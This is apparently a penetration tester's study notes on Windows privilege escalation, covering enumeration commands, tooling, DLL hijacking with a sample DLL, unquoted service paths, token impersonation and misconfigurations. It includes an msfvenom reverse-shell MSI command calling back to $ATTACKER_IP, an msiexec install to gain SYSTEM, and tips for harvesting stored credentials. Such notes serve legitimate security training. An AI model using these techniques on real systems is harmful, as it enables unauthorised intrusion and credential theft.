## Windows PrivEsc

### Introduction

Common Windows user levels:

* Local Admin
* Local User
* Guest User
* Domain User
* Domain Admin

Note that non-admin domain users may still be local admins.

Note that most Windows antivirus products will not allow enumeration scripts to be run.

Here’s a useful checklist:

* [Windows - Privilege Escalation (PayloadsAllTheThings)](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

### Information Gathering

* `whoami /rpiv` — current user + privileges
* `net user` — list all (local) users
* `net user $USERNAME` — get details for user `$USERNAME`
* `net localgroup` — list all (local) groups
* `net localgroup $GROUP` —- list user in group `$GROUP`
* `query session` — list other users who are currently logged in
* `systeminfo` — return system info
* `hostname` — return system hostname
* `wmic qfe get Caption,Description,HotFixID,InstalledOn` — list installed updates (only Windows 10 21H1 and older)
* `schtasks` — list scheduled tasks
* `driverquery` — list installed drivers
* `sc` — query (and manipulate) services (does not work in PowerShell!)

Note that the `findstr` command is the Windows equivalent of `grep` (and sometimes also `find`). Also remember that you can use pipe in Windows!

Note that Windows provides the `netstat` command, and it recognizes all of the switches we’d hope it does. Note, however, that `-o` displays the PID of the process using the connection on Windows.

Microsoft Defender uses the service name `windefend`.

* [Using “netstat”](../notes/netstat.md)

### Tools of the Trade

* [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
* [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
* [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [Metasploit](../notes/metasploit.md)

Notes:

* WinPEAS is detected and quarantined by Microsoft Defender by default.
* PowerUp may require an unrestricted PowerShell session (`powershell -nop -exec bypass`), which can raise alerts.
* Windows Exploit Suggester analyzes the output of `systeminfo`, and can be run on the attacker’s machine.
* The `multi/recon/local_exploit_suggester` module works through Meterpreter to analyze a Windows system for potential vulnerabilities.

### Vulnerable Software

* `wmic product` — list all installed software (but misses 32-bit applications installed on a 64-bit OS)
* `wimc service list brief` — another way of listing services

### DLL Hijacking

Basically, this is the Windows equivalent of exploiting `LD_PRELOAD` or `LD_LIBRARY_PATH`.

Windows DLL search order if `SafeDllSearchMode` is enabled:

* The application directory
* The system directory (as returned by `GetSystemDirectory()`)
* The 16-bit (!) system directory
* The Windows directory (as returned by `GetWindowsDirectory()`)
* The current directory (!)
* The system `PATH` (!)

Windows DLL search order if `SafeDllSearchMode` is disabled:

* The application directory
* The current directory (!)
* The system directory (as returned by `GetSystemDirectory()`)
* The 16-bit (!) system directory
* The Windows directory (as returned by `GetWindowsDirectory()`)
* The system `PATH` (!)

It seems more-or-less impossible to determine what DLLs an application is searching for without having SYSTEM access already (so tools like ProcMon can be run). So, local testing!

A skeleton DLL:

```c
#include <windows.h>

BOOL WINAPI DllMain
(HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
	if (dwReason == DLL_PROCESS_ATTACH) {
		system("cmd.exe /C whoami > C:\\Temp\\dll.txt");
		ExitProcess(0);
	}
	return TRUE;
}
```

Compile with mingw (this *can* be done on Linux!):

```powershell
x86_64-w64-mingw32-gcc windows_dll.c \
	-shared -o output.dll
```

Note that Windows *also* comes with `wget`!

```powershell
# Change user foo's password to "bar" (requires
# admin/SYSTEM authority):
#
net user foo bar
#
# Note that this does *NOT* bypass any password
# complexity requirements!
```

* [Exploiting LD_PRELOAD](../notes/exploiting-ld-preload.md)
* [Exploiting LD_LIBRARY_PATH](../notes/exploiting-ld-library-path.md)

### Unquoted Service Path

Formally, when Windows encounters an unquoted service path it tries *all* possible paths, from shortest to longest. Thus `C:\Program Files\service path\service.exe` will cause Windows to look for the following executables, in order:

* `C:\Program.exe`
* `C:\Program Files\service.exe`
* `C:\Program Files\service path\service.exe`

If an executable is found on a shorter path, then the remainder of the (unquoted) path is treated as command line parameters.

Print out all services:

```powershell
wmic service get name,displayname,pathname,startmode
```

You can inspect the service paths in this output to see if any have spaces *and* are unquoted.

When checking the permissions of a folder, note that the Windows File Explorer isn’t good about displaying permissions for users who have *multiple* applied ACLs. Use `icacls` or `Get-Acl $PATH | Format-List`, and be sure to keep your eyes peeled for duplicate user entries (*all* of which will be applied!).

Find a file in Windows:

```powershell
dir $FILE_NAME /S
```

### Token Impersonation

Prior to Windows 10 1809 / Server 2019, services could be forced to authenticate to a local port controlled by a low-privilege attacker, which would then allow the attacker to proxy and capture the NTLM handshake and thus (typically) a SYSTEM token. (This vulnerability *technically* still exists, its just that unprivileged accounts can no longer use this token; check to see if the output of `whoami /priv` contains the `SeImpersonatePrivilege` privilege to see if you’ve gotten lucky.)

Exploits in this family are typically named “X Potato” after the first exploit, “Hot Potato”.

### Quick Wins

(1) Look for defunct (but still running) scheduled tasks with running as a more highly privileged account that point to a path you can control.

(2) If `AlwaysInstallElevated`  is set to 1 under both of the following keys, then MSI installers will run as SYSTEM.

```powershell
reg query \
	HKCU\Software\Policies\Microsoft\Windows\Installer

reg query \
	HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

Generate a malicious MSI file with msfvenom:

```bash
msfvenom -p windows/x64/shell_reverse_tcp \
	LHOST=$ATTACKER_IP LPORT=$ATTACKER_PORT \
		-f msi -o $INSTALLER.msi
```

Then install on the target to gain SYSTEM:

```powershell
msiexec /quiet /qn /i $INSTALLER.msi
```

(3) Check for saved passwords of othe users with `cmdkey /list`. If any exist, then they can be used in `runas` with the `/savecred` flag.

(4) Sometimes registry keys contain passwords! Apparently, you can query/search across registry keys using `reg query …`.

(5) Windows uses a file called `unattend.xml` to store setup auto-configuration information. Check if these have been left lying around.
